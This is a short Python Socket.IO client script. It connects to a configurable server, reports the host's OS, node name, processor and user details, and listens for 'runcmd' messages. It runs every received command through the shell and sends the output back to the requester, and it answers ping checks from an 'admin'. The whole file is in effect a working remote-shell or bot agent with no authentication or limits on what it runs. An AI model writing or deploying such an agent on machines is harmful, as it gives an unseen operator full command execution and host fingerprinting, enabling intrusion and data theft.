import socketio
import platform
from datetime import datetime
import subprocess

# Create a Socket.IO client
sio = socketio.Client()

# Define a function to handle incoming messages
@sio.on('runcmd')
def handle_message(message):
    finalResult =""
    print(f'Received message: {message}')
    # send result back
    try:
        result = subprocess.run(message['cmd'],shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        finalResult = result.stdout
    except Exception as e:
        finalResult="Wrong Command"
        print(e)

    
    sio.emit('reply',{"to":message['from'],"result":finalResult})

# Connect to the Socket.IO server
sio.connect('http://localhost:3000')  # Replace with your server URL

# Join a room

sio.emit('joinRoom', {"user":True,"os":platform.platform(),"time":datetime.now().strftime('%Y-%m-%d %H:%M:%S'),"data":{
    "node":platform.node(),"processor":platform.processor(),"pythonVersion":platform.python_version(),
    "release":platform.release(),"user":platform.uname()
}})


#ping test
@sio.on('pingTest')
def pingtest(data):
    print('received ping req')
    admin = data["from"]
    print(f"got ping from {admin}")
    sio.emit("pingReply",{"to":admin})
    print("sending reply")
# Send a message to the room
message = 'Hello from Python!'
# sio.emit('chatMessage', {'message': message, 'room': room_name})

# Keep the client running
sio.wait()
